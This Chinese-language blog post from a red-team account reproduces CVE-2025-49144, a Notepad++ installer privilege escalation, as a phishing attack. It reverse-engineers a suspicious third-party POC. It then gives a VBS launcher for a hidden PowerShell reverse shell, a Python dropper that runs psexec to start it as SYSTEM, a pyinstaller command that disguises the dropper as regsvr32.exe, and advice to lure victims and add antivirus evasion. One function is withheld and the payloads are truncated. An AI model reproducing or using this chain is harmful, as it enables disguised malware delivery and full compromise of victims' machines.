#  [CVE-2025-49144] 超详细复现notepad++提权漏洞  
原创 红队安全圈  红队安全圈   2025-06-27 03:05  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2K9ohfEv3JP2mYJZmoFqadibP2NXm4ndPJ4BsaJLtbVvtsl3EYw8feSrIAFDTC9v6MaWm7MfNzJExg/640?wx_fmt=png&from=appmsg "")  
  
上一篇文章中简述了 notepad++ 的提权漏洞**CVE-2025-49144**  
，有师傅复现的时候遇到点疑问，这里详细写一个钓鱼并提权到 system 的复现过程  
  
   
  
> ⚠️ 免责声明：本公众号分享的技术方案仅用于  
  
✅ 合法授权的测试研究  
  
✅ 防御技术提升学习  
  
✅ 使用者造成的一切后果与作者无关  
  
禁止用于任何违反《网络安全法》及地方法规行为，使用者需对自身行为负全部法律责任  
  
  
   
### 前情提要和逆向分析  
  
6月24日看到POC发布者的文章后，立即进行了复现，当时作者是并未在GitHub发布POC，而是引导在谷歌网盘下载（现在已删除，只剩下一共演示视频，文章也被屏蔽）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9NicArwqicic5rwx6pJsDpWFic8URdbCxHXpdIs6vf1anwW0ibosoxqAeK3dA/640?wx_fmt=png&from=appmsg "null")  
  
  
以下是删除之前在网盘下载的POC，并非开源代码而是exe，来源不明的PE文件不要随便运行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9N7fzqbia4Hfxk2IYPCeMNQfAOJLC26QxNyQhbHltnQ95TYYQFyDXbd3w/640?wx_fmt=png&from=appmsg "null")  
  
  
图标是 pyinstaller 打包的默认图标，那他源码是 python 写的，PY的反编译很简单，花了一点点时间🤏逆向出源码如下  
1. 1. 有一段很大的 base64，他是一个反弹shell的 exe 文件编码后的  
  
1. 2. 脚本检测了当前用户的temp目录下是否存在 shell.exe 文件  
  
1. 3. 运行 exe 进行反弹 shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9NYbofETTdve6SKQqbIHGMP1iapicFhws3zAOohZf7qFOPd3ltcgTCOE8Q/640?wx_fmt=png&from=appmsg "null")  
  
  
在虚拟机运行后发现果然在temp目录释放了 psexec.exe 和 shell.exe 两个文件，前者是用来获取system会话，后者是木马文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9NibPNsTViaictBbAfsRkjgbj12NGKiaibibX9PAOqv0KTy05b7mPicFVx1jo6g/640?wx_fmt=png&from=appmsg "null")  
  
  
因此整体思路就明了了  
- • 1️⃣运行notepad++安装程序  
  
- • 2️⃣由于8.8.1版本的漏洞，导致加载了同目录下的 regsvr32.exe 文件  
  
- • 3️⃣regsvr32.exe 释放 psexec 和木文件  
  
- • 4️⃣psexec获取system会话，并使用system会话拉起木马文件  
  
- • 5️⃣最终木马以system权限运行起来  
  
原作者在github发布的漏洞文章，却引导读者去网盘下载POC，运行后隐藏到临时目录，并且现在也删除了原文和网盘，有点微妙🤔  
  
不过对于我们红队钓鱼来说确实是一个不错的范本，下面开始我的正式复现  
### 详细复现  
##### 准备好木🐎文件  
  
我这里以简单的反弹shell为例（实战中换成自己的木🐎并做好免杀），在  
revshells.com  
生成一个 powershell base64 的反弹命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9NACaUV5tDt5osKwHxGowk3xoTT93ibJmZf1Y5EgpICYbq5rian0j96x0g/640?wx_fmt=png&from=appmsg "null")  
  
  
反弹命令添加到如下vbs脚本中，这样处理运行时可以隐藏黑色命令行窗口  
```
Set WshShell = CreateObject("WScript.Shell")WshShell.Run "powershell -e JABjAGwAa......ADpAA==", 0
```  
##### base64 编码  
  
把这个vbs脚本和psexec.exe两个文件分别base64编码，这里直接在kali中完成即可，**-w 0**  
 参数禁止换行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9N1SKVVhYeY0Atq4DHY99XvLdhpUjAv5EibmTfRTEcwapSuYLhvXxXZeg/640?wx_fmt=png&from=appmsg "null")  
  
##### 修改 EXP  
  
然后把这两段base64复制到如下python脚本中的两个变量中  
```
import base64import osimport tempfileimport subprocessimport sys# base64编码后的exe文件psexec_base64 = "TVqQAA/+lDlzEJgLTf......G74JycgAA"revshell_base64 = "U2V0IFdzaFNoZWxs......iLCAw"defprint_banner():    print("""    ┌──────────────────────────────────────┐    │       微信公众号 · 红队安全圈           │    └──────────────────────────────────────┘    """)# 执行命令，禁止出现黑色弹窗defrun_hidden(command):    if sys.platform == 'win32':        '''        由于安全原因，请在公众号后台回复 CVE-2025-49144 获取完整python脚本        '''    else:        subprocess.run(command, shell=False)# 解码并输出到用户temp目录defrestore_exe(exe_base64,outname):    temp_dir = tempfile.gettempdir()    exe_path = os.path.join(temp_dir, outname)    try:        exe_data = base64.b64decode(exe_base64)        withopen(exe_path, 'wb') as f:            f.write(exe_data)        #print(f"restore file to: {os.path.abspath(exe_path)}")        returnTrue    except Exception as e:        #print(f"restore error: {e}")        returnFalseif __name__ == '__main__':    # 将base64编码的exe文件还原并释放到tmep    restore_exe(psexec_base64,outname='psexec.exe')    restore_exe(revshell_base64,outname='revshell.vbs')    # psexec 调起 system 权限的 wscript 执行 vbs 脚本    run_hidden([        os.path.join(tempfile.gettempdir(), 'psexec.exe'),        '-i', '-s', '-d',        'wscript.exe',        os.path.join(tempfile.gettempdir(), 'revshell.vbs'),        '-accepteula'    ])
```  
##### 打包成 exe  
  
最后把python脚本打包，并命名为 regsvr32.exe，记得要加上**-w**参数隐藏控制台  
```
pyinstaller -F 1.py -w -n regsvr32.exe
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9Nt5Y7ETxWMkFP42wrTGCRxm1jYBicSbzZ6BXANjtsnWyYVuvibtE4RxUA/640?wx_fmt=png&from=appmsg "null")  
  
##### 社工钓鱼上线 system  
  
最后把 regsvr32.exe 和 notepad++安装包放在同一个目录，攻击机开启监听，引导目标下载并执行安装程序，即可弹回system权限的shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2KASA1C9vkOCkY5aR4XkA9NryCibuxiakQ1VrUYcDgIibLFSOlZD4R2Z9zhf6NFaZHdWpNpiaoK1t0chg/640?wx_fmt=png&from=appmsg "null")  
  
  
欢迎关注   
红队安全圈  
  
回复   
CVE-2025-49144  
 获取完整脚本  
  
  
师傅给个   
一键四连 吧😄  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2J3Ykl5xDepRoqkSBlQKAEIEx0DHiaQHx6sBYGNDAI6Eia2ZnZLLsHzD8yxEGEVbrzzTL4Shrf7iaWWw/640?wx_fmt=gif&from=appmsg "")  
  
